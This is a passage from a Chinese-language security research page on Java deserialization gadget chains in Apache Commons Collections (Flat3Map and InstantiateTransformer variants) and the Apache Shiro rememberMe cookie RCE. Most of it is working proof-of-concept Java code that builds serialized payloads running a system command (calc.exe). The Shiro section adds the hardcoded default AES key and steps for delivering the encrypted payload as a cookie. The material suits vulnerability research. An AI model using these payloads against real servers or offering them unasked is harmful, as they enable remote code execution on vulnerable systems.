        DualLinkedHashBidiMap dualLinkedHashBidiMap = <span class="hljs-keyword">new</span> DualLinkedHashBidiMap();
        Field field1 = dualLinkedHashBidiMap.getClass().getSuperclass().getDeclaredField(<span class="hljs-string">&quot;normalMap&quot;</span>);
        field1.setAccessible(<span class="hljs-keyword">true</span>);
        field1.set(dualLinkedHashBidiMap, expMap);

        <span class="hljs-comment">//&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8986;&#x76D6;&#x539F;&#x672C;&#x7684;iTransformers&#xFF0C;&#x9632;&#x6B62;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x5728;&#x672C;&#x5730;&#x6267;&#x884C;&#x547D;&#x4EE4;</span>
        Field f = chainedTransformer.getClass().getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);
        f.setAccessible(<span class="hljs-keyword">true</span>);
        f.set(chainedTransformer, transformers);

        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);
        oos.writeObject(dualLinkedHashBidiMap);

        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);
        ois.readObject();
    }
}
</code></pre>
<h2 id="cc14flat3map">CC14_Flat3Map</h2>
<p>tabby&#x6316;&#x6398;</p>
<pre><code>match path=(m1:Method)-[:CALL*..1]-&gt;(sink:Method) where m1.NAME=~&quot;put&quot; and m1.IS_SERIALIZABLE=true and sink.NAME=&quot;equals&quot; return path
</code></pre><p>&#x4EE3;&#x66FF; hashtable &#x8D77;&#x5230;&#x51B2;&#x7A81;&#x4F5C;&#x7528;, 3&#x548C;4&#x7248;&#x672C;&#x7686;&#x53EF;(&#x5199;&#x6CD5;&#x7A0D;&#x5FAE;&#x6709;&#x4E9B;&#x4E0D;&#x540C;)</p>
<pre><code>Flat3Map#readObject
Flat3Map#put (2&#x7EC4;&#x6570;&#x636E;key&#x7684;hashCode&#x76F8;&#x7B49;&#x540E;&#x8FDB;&#x5165;equals&#x5224;&#x65AD;)
Flat3Map#equals(key1) (&#x524D;&#x4E00;&#x7EC4;key&#x4E3A;&#x6076;&#x610F;&#x7684;Map, &#x540E;&#x4E00;&#x7EC4;&#x4E3A;HashMap)
AbstractMap#get(key) &#x89E6;&#x53D1;&#x6076;&#x610F;Map&#x7684;get&#x65B9;&#x6CD5;, &#x540E;&#x7EED;&#x540C;CC7
</code></pre><p>POC</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> CommonsCollections;

<span class="hljs-keyword">import</span> org.apache.commons.codec.binary.Base64;
<span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.map.DefaultedMap;
<span class="hljs-keyword">import</span> org.apache.commons.collections.map.Flat3Map;

<span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;
<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;
<span class="hljs-keyword">import</span> java.io.ObjectInputStream;
<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> util.Reflections.setFieldValue;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC14_Flat3Map</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>{
        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> Transformer[] {<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)};
        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]{
            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),
            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]{String.class}, <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;calc.exe&quot;</span>}),
            <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)
        };
        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(fakeTransformers);
        Map innerMap1 = <span class="hljs-keyword">new</span> HashMap();
<span class="hljs-comment">//        Map lazyMap1 = LazyMap.decorate(innerMap1, chainedTransformer);</span>
<span class="hljs-comment">//        /**&#x51B2;&#x7A81;&#x662F;&#x6D4B;&#x8BD5;&#x540E;&#x5199;&#x597D;&#x7684;,&#x4E0D;&#x80FD;&#x4E71;&#x6539;*/</span>
<span class="hljs-comment">//        lazyMap1.put(&quot;yy&quot;, 1);</span>

        Map defaultMap1 = DefaultedMap.decorate(innerMap1, chainedTransformer);
        <span class="hljs-comment">/**&#x51B2;&#x7A81;&#x662F;&#x6D4B;&#x8BD5;&#x540E;&#x5199;&#x597D;&#x7684;,&#x4E0D;&#x80FD;&#x4E71;&#x6539;*/</span>
        defaultMap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);

        <span class="hljs-comment">/*jdk1.7~jdk1.8*/</span>
        Map outerMap = <span class="hljs-keyword">new</span> HashMap();
        outerMap.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);

        Flat3Map flat3Map = <span class="hljs-keyword">new</span> Flat3Map();
<span class="hljs-comment">//        flat3Map.put(lazyMap1, &quot;rce&quot;);</span>
        flat3Map.put(defaultMap1, <span class="hljs-string">&quot;rce&quot;</span>);
        setFieldValue(flat3Map, <span class="hljs-string">&quot;hash1&quot;</span>, <span class="hljs-number">0</span>);
        flat3Map.put(outerMap, <span class="hljs-string">&quot;ricky&quot;</span>);

        <span class="hljs-comment">//&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8986;&#x76D6;&#x539F;&#x672C;&#x7684;iTransformers&#xFF0C;&#x9632;&#x6B62;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x5728;&#x672C;&#x5730;&#x6267;&#x884C;&#x547D;&#x4EE4;</span>
        Field f = chainedTransformer.getClass().getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);
        f.setAccessible(<span class="hljs-keyword">true</span>);
        f.set(chainedTransformer, transformers);

        <span class="hljs-keyword">try</span>{
            <span class="hljs-comment">// serialize</span>
            ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
            ObjectOutputStream objectoutputstream = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);
            objectoutputstream.writeObject(flat3Map);
            objectoutputstream.close();

            System.out.println(Base64.encodeBase64String(barr.toByteArray()));

            <span class="hljs-comment">// unserialize</span>
            ObjectInputStream objectinputstream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(barr.toByteArray()));
            objectinputstream.readObject();
            objectinputstream.close();

        }<span class="hljs-keyword">catch</span>(Exception e){
            e.printStackTrace();
        }
    }
}
</code></pre>
<h2 id="cc15cc4-with-321">CC15_CC4 with 3.2.1</h2>
<p>&#x6E90;&#x4E8E;&#x4E00;&#x6B21;&#x6BD4;&#x8D5B;, &#x628A;&#x4E00;&#x4E9B;CommonCollections 3.2.1&#x4E0B;&#x5E38;&#x7528;&#x7684; Transformer &#x7ED9; ban &#x4E86;</p>
<pre><code>ConstantTransformer
InvokeTransformer
</code></pre><p>&#x4ECE;CC4&#x4E0B;&#x624B;&#x4E86;, &#x867D;&#x7136;&#x662F;&#x7528;&#x4E8E;CommonsCollections 4.0 &#x4F46;&#x662F;&#x53EF;&#x4EE5;&#x6539;&#x9020;&#x4E00;&#x4E0B;, ConstantTransformer#transform&#x65B9;&#x6CD5;&#x662F;&#x76F4;&#x63A5;&#x8FD4;&#x56DE;&#x4F20;&#x5165;&#x7684;&#x5BF9;&#x8C61;</p>
<pre><code>public Object transform(Object input) {
    return iConstant;
}
</code></pre><p>&#x88AB; ban &#x4EE5;&#x540E;&#x5C1D;&#x8BD5; TransformMap</p>
<pre><code>public Object transform(Object input) {
    return this.iMap.get(input);
}
</code></pre><p>&#x5176;&#x5B9E;&#x4E5F;&#x5F88;&#x660E;&#x663E;&#x5C31;&#x662F;&#x901A;&#x8FC7;key&#x503C;&#x53BB;&#x53D6;value, &#x6D4B;&#x8BD5;&#x4E86; hashMap#get &#x65B9;&#x6CD5;&#x5C31;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;, &#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5EFA;&#x7ACB; hashMap &#x628A;value&#x8D4B;&#x503C;&#x4E3A;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7684; TrAXFilter.class, &#x540E;&#x9762;&#x5C31;&#x662F;&#x901A;&#x8FC7;&#x4E00;&#x79CD;&#x65B9;&#x5F0F;&#x53BB;&#x89E6;&#x53D1; LazyMap.get &#x6216; DefaultedMap.get &#x5373;&#x53EF;, &#x8FD9;&#x91CC;&#x6211;&#x624D;&#x7528;&#x4E86;CC5(&#x56FE;&#x65B9;&#x4FBF;&#x5077;&#x61D2;), InvokeTransformer&#x5219;&#x662F;&#x53EF;&#x4EE5;&#x66FF;&#x6362;&#x6210; InstantiateTransformer, &#x56E0;&#x4E3A;&#x65B0;&#x5EFA; TrAXFilter &#x5BF9;&#x8C61;&#x89E6;&#x53D1;&#x4E86;&#x8FD9;&#x53E5;</p>
<pre><code>_transformer = (TransformerImpl) templates.newTransformer();
</code></pre><p>&#x7136;&#x540E;&#x5C31;&#x662F; TransformerImpl &#x7684;&#x6076;&#x610F;&#x6A21;&#x677F;&#x6CE8;&#x5165;, &#x8FD9;&#x6837;&#x4E5F;&#x5C31;&#x662F;&#x5C06;CC4&#x53D8;&#x6210;&#x4E86;&#x5168;&#x7248;&#x672C;&#x901A;&#x7528;&#x540C;&#x65F6;&#x6446;&#x8131;&#x4E86;3.2.1&#x4E24;&#x4E2A;&#x5E38;&#x7528;&#x7684; Transformer</p>
<p>POC</p>
<pre><code class="lang-java"><span class="hljs-keyword">package</span> CommonsCollections;

<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
<span class="hljs-keyword">import</span> javassist.ClassClassPath;
<span class="hljs-keyword">import</span> javassist.ClassPool;
<span class="hljs-keyword">import</span> javassist.CtClass;
<span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.MapTransformer;
<span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
<span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;

<span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;
<span class="hljs-keyword">import</span> javax.xml.transform.Templates;
<span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;
<span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;
<span class="hljs-keyword">import</span> java.io.ObjectInputStream;
<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC15_InstantiateTransformer</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(<span class="hljs-keyword">true</span>);
        field.set(obj, value);
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{
        <span class="hljs-comment">// ClassPool&#x662F; CtClass &#x5BF9;&#x8C61;&#x7684;&#x5BB9;&#x5668;&#x3002;&#x5B9E;&#x4F8B;&#x5316;&#x4E00;&#x4E2A;ClassPool&#x5BB9;&#x5668;&#x3002;</span>
        ClassPool classPool = ClassPool.getDefault();
        <span class="hljs-comment">// &#x5411;&#x5BB9;&#x5668;&#x4E2D;&#x7684;&#x7C7B;&#x641C;&#x7D22;&#x8DEF;&#x5F84;&#x7684;&#x8D77;&#x59CB;&#x4F4D;&#x7F6E;&#x63D2;&#x5165;AbstractTranslet.class&#xFF0C;&#x4E2A;&#x4EBA;&#x8BA4;&#x4E3A;&#x662F;&#x65B9;&#x4FBF;&#x8BA9;&#x540E;&#x9762;&#x80FD;&#x591F;&#x627E;&#x5230;&#x8FD9;&#x4E2A;&#x7C7B;</span>
        classPool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));
        <span class="hljs-comment">// &#x4F7F;&#x7528;&#x5BB9;&#x5668;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;CtClass&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;class&#xFF0C;&#x7C7B;&#x540D;&#x4E3A;Evil</span>
        CtClass ctClass = classPool.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);
        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;%s\&quot;);&quot;</span>;
        cmd = String.format(cmd, <span class="hljs-string">&quot;calc.exe&quot;</span>);
        <span class="hljs-comment">// &#x7ED9;&#x8FD9;&#x4E2A;&#x7C7B;&#x521B;&#x5EFA; static &#x4EE3;&#x7801;&#x5757;&#xFF0C;&#x5E76;&#x63D2;&#x5165;&#x5230;&#x7C7B;&#x4E2D;</span>
        ctClass.makeClassInitializer().insertBefore(cmd);
        String className = <span class="hljs-string">&quot;Evil&quot;</span> + System.nanoTime();
        <span class="hljs-comment">// &#x91CD;&#x65B0;&#x8BBE;&#x7F6E;&#x7C7B;&#x540D;&#x4E3A;&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x7684;&#x540D;&#x5B57;</span>
        ctClass.setName(className);
        <span class="hljs-comment">// &#x7ED9;&#x8FD9;&#x4E2A;&#x7C7B;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x7236;&#x7C7B;&#xFF0C;&#x5373;&#x7EE7;&#x627F;&#x8BE5;&#x7236;&#x7C7B;&#x3002;</span>
        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName())); <span class="hljs-comment">// &#x8BBE;&#x7F6E;&#x7236;&#x7C7B;&#x4E3A;AbstractTranslet&#xFF0C;&#x907F;&#x514D;&#x62A5;&#x9519;</span>
        <span class="hljs-comment">// &#x5C06;&#x8FD9;&#x4E2A;&#x7C7B;&#x8F93;&#x51FA;&#x5230;&#x9879;&#x76EE;&#x76EE;&#x5F55;&#x4E0B;</span>
<span class="hljs-comment">//        ctClass.writeFile(&quot;./&quot;);</span>
        <span class="hljs-comment">// &#x5C06;&#x8FD9;&#x4E2A;class&#x8F6C;&#x6362;&#x4E3A;&#x5B57;&#x8282;&#x6570;&#x7EC4;</span>
        <span class="hljs-keyword">byte</span>[] classBytes = ctClass.toBytecode();
        <span class="hljs-comment">// &#x5C06;&#x5B57;&#x8282;&#x6570;&#x7EC4;&#x653E;&#x7F6E;&#x5230;&#x4E00;&#x4E2A;&#x4E8C;&#x7EF4;&#x6570;&#x7EC4;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5143;&#x7D20;</span>
        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{classBytes};
        <span class="hljs-comment">// &#x5B9E;&#x4F8B;&#x5316;TemplatesImpl&#x5BF9;&#x8C61;</span>
        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();
        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);
        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EvilTemplatesImpl&quot;</span>);
        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);
        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());

        Map hashMap = <span class="hljs-keyword">new</span> HashMap();
        hashMap.put(<span class="hljs-string">&quot;ricky&quot;</span>, TrAXFilter.class);
        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> Transformer[] {<span class="hljs-comment">/*new ConstantTransformer(1)*/</span>};
        Transformer mapTransformer = MapTransformer.getInstance(hashMap);
        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]{
                mapTransformer,
                <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]{Templates.class}, <span class="hljs-keyword">new</span> Object[]{templates})
        };

        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(fakeTransformers);

        Map innerMap = <span class="hljs-keyword">new</span> HashMap();
        <span class="hljs-comment">// &#x8C03;&#x7528;decorate&#x4E3B;&#x8981;&#x662F;&#x76F4;&#x63A5;&#x5199;&#x5165;&#x7684;&#x65B9;&#x6CD5;&#x662F;protected, &#x9700;&#x8981;&#x8BBE;&#x7F6E;&#x6743;&#x9650;&#x624D;&#x884C;, &#x800C;&#x8BE5;&#x65B9;&#x6CD5;&#x662F;public</span>
        Map outerMap = LazyMap.decorate(innerMap, chainedTransformer);
        <span class="hljs-comment">/**
         * BadAttributeValueException.readObject -&gt;
         * TiedMapEntry.toString -&gt;
         * TiedMapEntry.getValue -&gt;
         * (this.map.get)LazyMap.get -&gt;
         * ChainedTransformer.transform
         * */</span>
        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap, <span class="hljs-string">&quot;ricky&quot;</span>);
        <span class="hljs-comment">/*jdk1.8*/</span>
        BadAttributeValueExpException badAttributeValueExpException = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-keyword">null</span>);
<span class="hljs-comment">//        setFieldValue(badAttributeValueExpException, &quot;val&quot;, tiedMapEntry); //&#x8C03;&#x7528;CC2&#x5199;&#x597D;&#x7684;&#x8BBE;&#x7F6E;&#x51FD;&#x6570;</span>
        <span class="hljs-comment">// &#x5355;&#x72EC;&#x8BBE;&#x7F6E;</span>
        Field field = badAttributeValueExpException.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);
        field.setAccessible(<span class="hljs-keyword">true</span>);
        field.set(badAttributeValueExpException, tiedMapEntry);

        <span class="hljs-comment">//&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8986;&#x76D6;&#x539F;&#x672C;&#x7684;iTransformers&#xFF0C;&#x9632;&#x6B62;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x5728;&#x672C;&#x5730;&#x6267;&#x884C;&#x547D;&#x4EE4;</span>
        setFieldValue(chainedTransformer, <span class="hljs-string">&quot;iTransformers&quot;</span>, transformers);

        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();
        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);
        oos.writeObject(badAttributeValueExpException);
        oos.close();

        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(barr.toByteArray()));
        ois.readObject();
        ois.close();
    }
}
</code></pre>
<h2 id="commonscollectionsshiro">CommonsCollectionsShiro</h2>
<p>&#x5F71;&#x54CD;&#x7248;&#x672C;&#xFF1A;Apache Shiro &lt; 1.2.4</p>
<p>&#x7279;&#x5F81;&#x5224;&#x65AD;&#xFF1A;&#x8FD4;&#x56DE;&#x5305;&#x4E2D;&#x5305;&#x542B;rememberMe=deleteMe&#x5B57;&#x6BB5;</p>
<p>shiro&#x9ED8;&#x8BA4;&#x4F7F;&#x7528;&#x4E86;CookieRememberMeManager&#xFF0C;&#x5176;&#x5904;&#x7406;cookie&#x7684;&#x6D41;&#x7A0B;&#x662F;&#xFF1A;&#x5F97;&#x5230;rememberMe&#x7684;cookie&#x503C;&gt;&gt;&gt;Base64&#x89E3;&#x7801;&gt;&gt;&gt;AES&#x89E3;&#x5BC6;&gt;&gt;&gt;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x3002;&#x7136;&#x800C;AES&#x7684;&#x5BC6;&#x94A5;&#x662F;&#x786C;&#x7F16;&#x7801;&#x7684;&#xFF0C;&#x5C31;&#x5BFC;&#x81F4;&#x4E86;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x6784;&#x9020;&#x6076;&#x610F;&#x6570;&#x636E;&#x9020;&#x6210;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;RCE&#x6F0F;&#x6D1E;&#x3002; </p>
<p>&#x53C2;&#x8003;: <a href="https://y4er.com/post/shiro-rememberme-rce/" target="_blank">https://y4er.com/post/shiro-rememberme-rce/</a></p>
<p>AES&#x52A0;&#x5BC6;&#x7684;&#x6D41;&#x7A0B;&#x4E3B;&#x8981;&#x5728; org.apache.shiro.mgt.AbstractRememberMeManage&#x4E2D;</p>
<pre><code class="lang-java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AbstractRememberMeManager</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">RememberMeManager</span> </span>{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Logger log = LoggerFactory.getLogger(AbstractRememberMeManager.class);
    <span class="hljs-comment">// &#x5BC6;&#x94A5;</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);
    <span class="hljs-comment">// AES&#x52A0;&#x5BC6;, &#x6A21;&#x5F0F;&#x4E3A;CBC</span>
    <span class="hljs-keyword">private</span> Serializer&lt;PrincipalCollection&gt; serializer = <span class="hljs-keyword">new</span> DefaultSerializer();
    <span class="hljs-keyword">private</span> CipherService cipherService = <span class="hljs-keyword">new</span> AesCipherService();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">byte</span>[] encryptionCipherKey;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">byte</span>[] decryptionCipherKey;
    ...
    <span class="hljs-comment">// &#x52A0;&#x5BC6;&#x6D41;&#x7A0B;</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">byte</span>[] encrypt(<span class="hljs-keyword">byte</span>[] serialized) {
        <span class="hljs-keyword">byte</span>[] value = serialized;
        CipherService cipherService = <span class="hljs-keyword">this</span>.getCipherService();
        <span class="hljs-keyword">if</span> (cipherService != <span class="hljs-keyword">null</span>) {
            ByteSource byteSource = cipherService.encrypt(serialized, <span class="hljs-keyword">this</span>.getEncryptionCipherKey());
            value = byteSource.getBytes();
        }
        <span class="hljs-keyword">return</span> value;
    }
    <span class="hljs-comment">// &#x89E3;&#x5BC6;&#x6D41;&#x7A0B;</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">byte</span>[] decrypt(<span class="hljs-keyword">byte</span>[] encrypted) {
        <span class="hljs-keyword">byte</span>[] serialized = encrypted;
        CipherService cipherService = <span class="hljs-keyword">this</span>.getCipherService();
        <span class="hljs-keyword">if</span> (cipherService != <span class="hljs-keyword">null</span>) {
            ByteSource byteSource = cipherService.decrypt(encrypted, <span class="hljs-keyword">this</span>.getDecryptionCipherKey());
            serialized = byteSource.getBytes();
        }
        <span class="hljs-keyword">return</span> serialized;
    }
    ...
    <span class="hljs-comment">// &#x6700;&#x540E;&#x8C03;&#x7528;&#x53CD;&#x5E8F;&#x5217;&#x5316;</span>
    <span class="hljs-function"><span class="hljs-keyword">protected</span> PrincipalCollection <span class="hljs-title">deserialize</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] serializedIdentity)</span> </span>{
        <span class="hljs-keyword">return</span> (PrincipalCollection)<span class="hljs-keyword">this</span>.getSerializer().deserialize(serializedIdentity);
    }
</code></pre>
<p>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x65B9;&#x6CD5;&#x5728;org.apache.shiro.io.DefaultSerializer&#x4E2D;</p>
<pre><code class="lang-java">    <span class="hljs-function"><span class="hljs-keyword">public</span> T <span class="hljs-title">deserialize</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] serialized)</span> <span class="hljs-keyword">throws</span> SerializationException </span>{
        <span class="hljs-keyword">if</span> (serialized == <span class="hljs-keyword">null</span>) {
            String msg = <span class="hljs-string">&quot;argument cannot be null.&quot;</span>;
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(msg);
        } <span class="hljs-keyword">else</span> {
            ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(serialized);
            BufferedInputStream bis = <span class="hljs-keyword">new</span> BufferedInputStream(bais);
            <span class="hljs-keyword">try</span> {
                ObjectInputStream ois = <span class="hljs-keyword">new</span> ClassResolvingObjectInputStream(bis);
                <span class="hljs-comment">// &#x53CD;&#x5E8F;&#x5217;&#x5316;</span>
                T deserialized = ois.readObject();
                ois.close();
                <span class="hljs-keyword">return</span> deserialized;
            } <span class="hljs-keyword">catch</span> (Exception var6) {
                String msg = <span class="hljs-string">&quot;Unable to deserialze argument byte array.&quot;</span>;
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> SerializationException(msg, var6);
            }
        }
    }
</code></pre>
<p>&#x653B;&#x51FB;&#x8FC7;&#x7A0B;&#x5982;&#x4E0B;&#xFF1A; </p>
<ol>
<li><p>&#x4F7F;&#x7528;CommonsCollections6_DefaultedMap&#x5229;&#x7528;&#x94FE;&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x5E8F;&#x5217;&#x5316;Payload </p>
</li>
<li><p>&#x4F7F;&#x7528;Shiro&#x9ED8;&#x8BA4;Key&#x8FDB;&#x884C;&#x52A0;&#x5BC6; </p>
</li>
<li><p>&#x5C06;&#x5BC6;&#x6587;&#x4F5C;&#x4E3A;rememberMe&#x7684;Cookie&#x53D1;&#x9001;&#x7ED9;&#x670D;&#x52A1;&#x7AEF;</p>
</li>
</ol>
<p>&#x76F4;&#x63A5;&#x5C06;&#x5176;&#x52A0;&#x5BC6;&#x540E;&#x751F;&#x6210;&#x7684;base64&#x5B57;&#x7B26;&#x4E32;&#x653E;&#x7F6E;RememberMe, &#x4F1A;&#x51FA;&#x73B0;&#x5982;&#x4E0B;&#x62A5;&#x9519;</p>
<p><img src="img/1642400371744.png" alt="1642400371744"></p>
<p>&#x53C2;&#x8003;: </p>
<ul>
<li><a href="https://blog.zsxsoft.com/post/35" target="_blank">https://blog.zsxsoft.com/post/35</a></li>
<li><a href="https://www.anquanke.com/post/id/192619" target="_blank">https://www.anquanke.com/post/id/192619</a></li>
</ul>
<p>&#x4E3B;&#x8981;&#x539F;&#x56E0;&#x4E3A;: <strong>&#x5982;&#x679C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6D41;&#x4E2D;&#x5305;&#x542B;&#x975E;Java&#x81EA;&#x8EAB;&#x7684;&#x6570;&#x7EC4;&#xFF0C;&#x5219;&#x4F1A;&#x51FA;&#x73B0;&#x65E0;&#x6CD5;&#x52A0;&#x8F7D;&#x7C7B;&#x7684;&#x9519;&#x8BEF;</strong>&#x3002;&#x8FD9;&#x5C31;&#x89E3;&#x91CA;&#x4E86;&#x4E3A;&#x4EC0;&#x4E48;CommonsCollections6&#x65E0;&#x6CD5;&#x5229;&#x7528;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x5176;&#x4E2D;&#x7528;&#x5230;&#x4E86;Transformer&#x6570;&#x7EC4;&#x3002;</p>
